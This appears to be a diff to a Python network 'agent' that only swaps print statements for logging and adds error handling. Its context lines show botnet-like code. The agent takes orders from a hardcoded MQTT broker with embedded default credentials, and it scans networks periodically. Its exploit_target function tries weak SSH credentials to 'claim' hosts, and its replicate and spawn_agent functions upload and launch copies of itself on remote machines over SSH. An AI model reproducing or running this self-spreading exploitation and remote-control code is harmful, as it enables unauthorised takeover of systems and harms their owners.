@@ -13,12 +13,17 @@ import socket
 import threading
 from urllib.parse import urlparse
 import os
+import logging
+
+# Logging setup
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
 
 # Konfigurasi agent dari variabel lingkungan dengan default
 AGENT_ID = str(uuid.uuid4())
 MQTT_BROKER = os.getenv("MQTT_BROKER", "5374fec8494a4a24add8bb27fe4ddae5.s1.eu.hivemq.cloud:8883")
 MQTT_USERNAME = os.getenv("MQTT_USERNAME", "throng_user")
-MQTT_PASSWORD = os.getenv("MQTT_PASSWORD", "ThrongPass123")
+MQTT_PASSWORD = os.getenv("MQTT_PASSWORD", "ThrongPass123!")
 TOPIC_REPORTS = "throng/reports"
 TOPIC_COMMANDS = f"throng/commands/{AGENT_ID}"
 TOPIC_PEER = "throng/peer"
@@ -27,7 +32,7 @@ TOPIC_EMERGENCY = "throng/emergency"
 
 # Callback saat terkoneksi
 def on_connect(client, userdata, flags, rc, properties=None):
-    print(f"Agent {AGENT_ID} connected with code {rc}")
+    logger.info(f"Agent {AGENT_ID} connected with code {rc}")
     if rc == 0:
         client.subscribe(TOPIC_COMMANDS)
         client.subscribe(TOPIC_PEER)
@@ -35,29 +40,32 @@ def on_connect(client, userdata, flags, rc, properties=None):
 
 # Callback saat menerima perintah
 def on_message(client, userdata, msg):
-    command = json.loads(msg.payload.decode())
-    if command.get("agent_id") == AGENT_ID or msg.topic in [TOPIC_PEER, TOPIC_EMERGENCY]:
-        action = command.get("action")
-        target = command.get("target")
-        params = command.get("params", {})
-        emergency = command.get("emergency", False)
-        
-        print(f"Received command: {action} on {target} (Emergency: {emergency})")
-        
-        if action == "block_ip":
-            block_ip(target, emergency)
-        elif action == "send_honeypot":
-            send_honeypot(target, emergency)
-        elif action == "redirect_traffic":
-            redirect_traffic(target, emergency)
-        elif action == "spawn_agent":
-            spawn_agent(target, params.get("credentials"))
-        elif action == "replicate":
-            replicate(target, params.get("credentials"))
-        elif action == "scan_target":
-            scan_target(target, emergency)
-        elif action == "exploit_target":
-            exploit_target(target, params, emergency)
+    try:
+        command = json.loads(msg.payload.decode())
+        if command.get("agent_id") == AGENT_ID or msg.topic in [TOPIC_PEER, TOPIC_EMERGENCY]:
+            action = command.get("action")
+            target = command.get("target")
+            params = command.get("params", {})
+            emergency = command.get("emergency", False)
+            
+            logger.info(f"Received command: {action} on {target} (Emergency: {emergency})")
+            
+            if action == "block_ip":
+                block_ip(target, emergency)
+            elif action == "send_honeypot":
+                send_honeypot(target, emergency)
+            elif action == "redirect_traffic":
+                redirect_traffic(target, emergency)
+            elif action == "spawn_agent":
+                spawn_agent(target, params.get("credentials"))
+            elif action == "replicate":
+                replicate(target, params.get("credentials"))
+            elif action == "scan_target":
+                scan_target(target, emergency)
+            elif action == "exploit_target":
+                exploit_target(target, params, emergency)
+    except Exception as e:
+        logger.error(f"Error processing command: {e}")
 
 # Modul pengambilan keputusan
 def decide_action(report_data):
@@ -71,12 +79,12 @@ def decide_action(report_data):
 def block_ip(target, emergency=False):
     try:
         subprocess.run(["iptables", "-A", "INPUT", "-s", target, "-j", "DROP"], check=True)
-        print(f"Blocked IP {target}")
+        logger.info(f"Blocked IP {target}")
         log_action("block_ip", target, emergency)
         if emergency:
             client.publish(TOPIC_EMERGENCY, json.dumps({"agent_id": AGENT_ID, "action": "block_ip", "target": target}))
     except Exception as e:
-        print(f"Error in block_ip: {e}")
+        logger.error(f"Error in block_ip: {e}")
 
 def send_honeypot(target, emergency=False):
     try:
@@ -86,17 +94,17 @@ def send_honeypot(target, emergency=False):
             "agent_id": AGENT_ID
         }
         requests.post(f"http://{target}/log", json=fake_data, timeout=2)
-        print(f"Sent honeypot to {target}")
+        logger.info(f"Sent honeypot to {target}")
         log_action("send_honeypot", target, emergency)
     except Exception as e:
-        print(f"Error in send_honeypot: {e}")
+        logger.error(f"Error in send_honeypot: {e}")
 
 def redirect_traffic(target, emergency=False):
     try:
-        print(f"Redirected traffic from {target}")
+        logger.info(f"Redirected traffic from {target}")
         log_action("redirect_traffic", target, emergency)
     except Exception as e:
-        print(f"Error in redirect_traffic: {e}")
+        logger.error(f"Error in redirect_traffic: {e}")
 
 def replicate(host, credentials):
     try:
@@ -108,10 +116,10 @@ def replicate(host, credentials):
         ssh.exec_command("python3 /tmp/agent.py &")
         sftp.close()
         ssh.close()
-        print(f"Replicated to {host}")
+        logger.info(f"Replicated to {host}")
         log_action("replicate", host)
     except Exception as e:
-        print(f"Error in replicate: {e}")
+        logger.error(f"Error in replicate: {e}")
 
 def spawn_agent(host, credentials):
     try:
@@ -124,11 +132,11 @@ def spawn_agent(host, credentials):
         ssh.exec_command(f"python3 /tmp/agent_{new_agent_id}.py &")
         sftp.close()
         ssh.close()
-        print(f"Spawned agent {new_agent_id} on {host}")
+        logger.info(f"Spawned agent {new_agent_id} on {host}")
         log_action("spawn_agent", host)
         client.publish(TOPIC_REPORTS, json.dumps({"agent_id": new_agent_id, "data": {"ip": socket.gethostbyname(host)}}))
     except Exception as e:
-        print(f"Error in spawn_agent: {e}")
+        logger.error(f"Error in spawn_agent: {e}")
 
 def scan_target(target, emergency=False):
     try:
@@ -167,12 +175,12 @@ def scan_target(target, emergency=False):
             }
         }
         client.publish(TOPIC_SCANS, json.dumps(report))
-        print(f"Scan results for {target}: {vulnerabilities}")
+        logger.info(f"Scan results for {target}: {vulnerabilities}")
         log_action("scan_target", target, emergency)
         if emergency:
             client.publish(TOPIC_EMERGENCY, json.dumps({"agent_id": AGENT_ID, "action": "scan_target", "target": target, "vulnerabilities": vulnerabilities}))
     except Exception as e:
-        print(f"Error in scan_target: {e}")
+        logger.error(f"Error in scan_target: {e}")
 
 def exploit_target(target, params, emergency=False):
     try:
@@ -190,7 +198,7 @@ def exploit_target(target, params, emergency=False):
                 ssh.close()
                 vulnerabilities.append(f"Weak SSH credentials: {creds['username']}:{creds['password']}")
                 spawn_agent(target, creds)
-                print(f"Exploited and claimed {target}")
+                logger.info(f"Exploited and claimed {target}")
                 log_action("exploit_target", target, emergency)
                 if emergency:
                     client.publish(TOPIC_EMERGENCY, json.dumps({"agent_id": AGENT_ID, "action": "exploit_target", "target": target, "status": "claimed"}))
@@ -216,7 +224,7 @@ def exploit_target(target, params, emergency=False):
         client.publish(TOPIC_SCANS, json.dumps(report))
         log_action("exploit_target", target, emergency, f"Vulnerabilities: {vulnerabilities}")
     except Exception as e:
-        print(f"Error in exploit_target: {e}")
+        logger.error(f"Error in exploit_target: {e}")
 
 def proactive_scan():
     while True:
@@ -243,10 +251,10 @@ def proactive_scan():
                     }
                 }
                 client.publish(TOPIC_SCANS, json.dumps(report))
-                print(f"Proactive scan found host: {host}")
+                logger.info(f"Proactive scan found host: {host}")
                 log_action("proactive_scan", host)
         except Exception as e:
-            print(f"Error in proactive_scan: {e}")
+            logger.error(f"Error in proactive_scan: {e}")
         time.sleep(1800)  # Scan setiap 30 menit
 
 def collect_data(emergency=False):
@@ -268,7 +276,7 @@ def collect_data(emergency=False):
                     scan_target(action["target"], action["emergency"])
         return data
     except Exception as e:
-        print(f"Error collecting data: {e}")
+        logger.error(f"Error collecting data: {e}")
         return {}
 
 def log_action(action, target, emergency=False, details=""):
@@ -279,11 +287,12 @@ def publish_with_retry(topic, payload, retries=3):
     for i in range(retries):
         try:
             client.publish(topic, json.dumps(payload))
+            logger.info(f"Published to {topic}")
             return
         except Exception as e:
-            print(f"Publish failed: {e}, retry {i+1}/{retries}")
+            logger.error(f"Publish failed: {e}, retry {i+1}/{retries}")
             time.sleep(2 ** i)  # Exponential backoff
-    print(f"Failed to publish after {retries} retries")
+    logger.error(f"Failed to publish after {retries} retries")
 
 # Inisialisasi MQTT client
 client = mqtt.Client(callback_api_version=mqtt.CallbackAPIVersion.VERSION2)
@@ -304,5 +313,5 @@ while True:
         "data": collect_data()
     }
     publish_with_retry(TOPIC_REPORTS, report)
-    print(f"Agent {AGENT_ID} sent report: {report}")
+    logger.info(f"Agent {AGENT_ID} sent report: {report}")
     time.sleep(60)
